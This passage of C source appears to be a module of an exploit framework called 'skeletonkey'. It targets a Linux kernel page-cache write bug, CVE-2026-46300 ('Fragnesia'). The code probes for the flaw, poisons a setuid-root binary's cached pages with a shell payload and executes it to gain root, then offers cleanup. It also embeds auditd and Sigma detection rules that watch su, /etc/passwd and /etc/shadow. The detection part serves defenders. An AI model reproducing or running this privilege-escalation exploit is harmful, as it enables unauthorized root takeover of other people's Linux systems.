				"binary >= %d bytes — exploit has no carrier\n",
				FRAG_LEN);
		return SKELETONKEY_PRECOND_FAIL;
	}

	bool patched_by_version = kernel_range_is_patched(&fragnesia_range, &v);

	if (ctx->active_probe) {
		if (!ctx->json)
			fprintf(stderr, "[*] fragnesia: running active probe "
				"(safe; /tmp file only)\n");
		int p = fg_active_probe();
		if (p == 1) {
			if (!ctx->json)
				fprintf(stderr, "[!] fragnesia: ACTIVE PROBE "
					"CONFIRMED — ESP-in-TCP coalesce corrupts "
					"the page cache (kernel %s)\n", v.release);
			return SKELETONKEY_VULNERABLE;
		}
		if (p == 0) {
			if (!ctx->json)
				fprintf(stderr, "[+] fragnesia: active probe did "
					"not land — primitive blocked (likely "
					"patched%s, or CONFIG_INET_ESPINTCP off)\n",
					patched_by_version ? "" : "; distro may have "
					"backported, or Dirty Frag is unpatched here");
			return SKELETONKEY_OK;
		}
		if (!ctx->json)
			fprintf(stderr, "[?] fragnesia: active probe machinery "
				"failed; falling back to version verdict\n");
	}

	if (patched_by_version) {
		if (!ctx->json)
			fprintf(stderr, "[+] fragnesia: kernel %s is patched "
				"(7.0.9+; version-only check — use --active to "
				"confirm)\n", v.release);
		return SKELETONKEY_OK;
	}
	if (!ctx->json)
		fprintf(stderr, "[!] fragnesia: kernel %s appears VULNERABLE "
			"(no backport entry for this branch; version-only)\n"
			"    Confirm empirically: skeletonkey --scan --active\n",
			v.release);
	return SKELETONKEY_VULNERABLE;
}

/* ---- exploit ------------------------------------------------------ */

/* Runs in a forked child. On the shell path it execs the target and
 * never returns. Exit codes: 0 ok, 2 fail, 3 partial, 4 precond,
 * 10 not vulnerable (fixed). */
static void fg_child(const char *target_path, int no_shell)
{
	uint64_t file_size = use_existing_target(target_path);
	verify_write_denied("outer");
	setup_user_netns_xfrm();
	verify_write_denied("userns-root-mapped-to-outer-user");

	int rc = replace_existing_bytes_after(0, shell_elf, PAYLOAD_LEN, file_size);
	if (rc == 0) _exit(10);
	if (rc == 2) _exit(2);
	if (rc == 3) _exit(3);

	/* rc == 1: payload fully verified in the page cache */
	if (no_shell) {
		LOG("--no-shell: payload placed, shell not spawned");
		LOG("revert with `skeletonkey --cleanup fragnesia`");
		_exit(0);
	}
	LOG("page cache poisoned; exec %s to claim root", target_path);
	fflush(NULL);
	execve(target_path, (char *[]){ (char *)target_path, NULL }, (char *[]){ NULL });
	perror("execve target");
	_exit(2);
}

static skeletonkey_result_t fg_exploit(const struct skeletonkey_ctx *ctx)
{
	fg_verbose = !ctx->json;

	if (geteuid() == 0) {
		fprintf(stderr, "[i] fragnesia: already root — nothing to do\n");
		return SKELETONKEY_OK;
	}

	const char *target = fg_pick_target();
	if (!target) {
		ERR("no readable setuid-root carrier >= %d bytes", FRAG_LEN);
		return SKELETONKEY_PRECOND_FAIL;
	}
	LOG("target carrier: %s", target);

	int sf = open("/tmp/skeletonkey-fragnesia.target",
		      O_WRONLY | O_CREAT | O_TRUNC, 0600);
	if (sf >= 0) { if (write(sf, target, strlen(target)) < 0) {} close(sf); }

	pid_t pid = fork();
	if (pid < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }
	if (pid == 0)
		fg_child(target, ctx->no_shell);   /* never returns on shell path */

	int st;
	waitpid(pid, &st, 0);
	if (!WIFEXITED(st))
		return SKELETONKEY_EXPLOIT_FAIL;
	switch (WEXITSTATUS(st)) {
	case 0:  return SKELETONKEY_EXPLOIT_OK;
	case 4:  return SKELETONKEY_PRECOND_FAIL;
	case 10: return SKELETONKEY_OK;          /* kernel patched */
	default: return SKELETONKEY_EXPLOIT_FAIL;
	}
}

/* ---- cleanup ------------------------------------------------------ */

static skeletonkey_result_t fg_cleanup(const struct skeletonkey_ctx *ctx)
{
	fg_verbose = !ctx->json;

	char target[256] = {0};
	int sf = open("/tmp/skeletonkey-fragnesia.target", O_RDONLY);
	if (sf >= 0) {
		ssize_t n = read(sf, target, sizeof(target) - 1);
		if (n > 0) target[n] = '\0';
		close(sf);
	}
	if (target[0]) {
		LOG("evicting %s from page cache", target);
		fg_evict(target);
		unlink("/tmp/skeletonkey-fragnesia.target");
	} else {
		LOG("no recorded target; evicting all candidate carriers");
		for (int i = 0; fg_targets[i]; i++)
			fg_evict(fg_targets[i]);
	}
	return SKELETONKEY_OK;
}

#else  /* !__linux__ */

static skeletonkey_result_t fg_detect(const struct skeletonkey_ctx *ctx)
{
	if (!ctx->json)
		fprintf(stderr, "[i] fragnesia: Linux-only module "
			"(XFRM ESP-in-TCP) — not applicable on this platform\n");
	return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t fg_exploit(const struct skeletonkey_ctx *ctx)
{
	(void)ctx;
	fprintf(stderr, "[-] fragnesia: Linux-only module — cannot run here\n");
	return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t fg_cleanup(const struct skeletonkey_ctx *ctx)
{
	(void)ctx;
	return SKELETONKEY_OK;
}

#endif /* __linux__ */

/* ---- detection rules (embedded) ----------------------------------- */

static const char fg_auditd[] =
	"# Fragnesia (CVE-2026-46300) — auditd detection rules\n"
	"# XFRM ESP-in-TCP coalesce bug → page-cache write into a read-only file.\n"
	"-w /usr/bin/su     -p wa -k skeletonkey-fragnesia\n"
	"-w /bin/su         -p wa -k skeletonkey-fragnesia\n"
	"-w /etc/passwd     -p wa -k skeletonkey-fragnesia\n"
	"-w /etc/shadow     -p wa -k skeletonkey-fragnesia\n"
	"# AF_ALG socket creation (family 38) — builds the GCM keystream table\n"
	"-a always,exit -F arch=b64 -S socket -F a0=38 -k skeletonkey-fragnesia-afalg\n"
	"# XFRM state setup over NETLINK_XFRM\n"
	"-a always,exit -F arch=b64 -S sendto -k skeletonkey-fragnesia-xfrm\n"
	"# TCP_ULP espintcp + ESP setsockopt surface\n"
	"-a always,exit -F arch=b64 -S setsockopt -k skeletonkey-fragnesia-sockopt\n"
	"# splice() drives page-cache pages into the ESP-in-TCP stream\n"
	"-a always,exit -F arch=b64 -S splice -k skeletonkey-fragnesia-splice\n";

static const char fg_sigma[] =
	"title: Possible Fragnesia exploitation (CVE-2026-46300)\n"
	"id: 9b3d2e71-skeletonkey-fragnesia\n"
	"status: experimental\n"
	"description: |\n"
	"  Detects the footprint of the Fragnesia XFRM ESP-in-TCP page-cache\n"
	"  write (CVE-2026-46300): non-root modification of a setuid-root\n"
	"  binary or /etc/passwd, typically inside a freshly created user +\n"
	"  network namespace.\n"
	"logsource: {product: linux, service: auditd}\n"
	"detection:\n"
	"  modification:\n"
	"    type: 'PATH'\n"
	"    name|startswith: ['/usr/bin/su', '/bin/su', '/etc/passwd', '/etc/shadow']\n"
	"  not_root:\n"
	"    auid|expression: '!= 0'\n"
	"  condition: modification and not_root\n"
	"level: high\n"
	"tags: [attack.privilege_escalation, attack.t1068, cve.2026.46300]\n";

const struct skeletonkey_module fragnesia_module = {
	.name           = "fragnesia",
	.cve            = "CVE-2026-46300",
	.summary        = "XFRM ESP-in-TCP skb_try_coalesce SHARED_FRAG loss → page-cache write",
	.family         = "fragnesia",
	.kernel_range   = "Linux with CONFIG_INET_ESPINTCP and the Dirty Frag fix; mainline fix in 7.0.9 (older branches still unfixed)",
	.detect         = fg_detect,
	.exploit        = fg_exploit,
	.mitigate       = NULL,
	.cleanup        = fg_cleanup,
	.detect_auditd  = fg_auditd,
	.detect_sigma   = fg_sigma,
	.detect_yara    = NULL,
	.detect_falco   = NULL,
};

void skeletonkey_register_fragnesia(void)
{
	skeletonkey_register(&fragnesia_module);
}
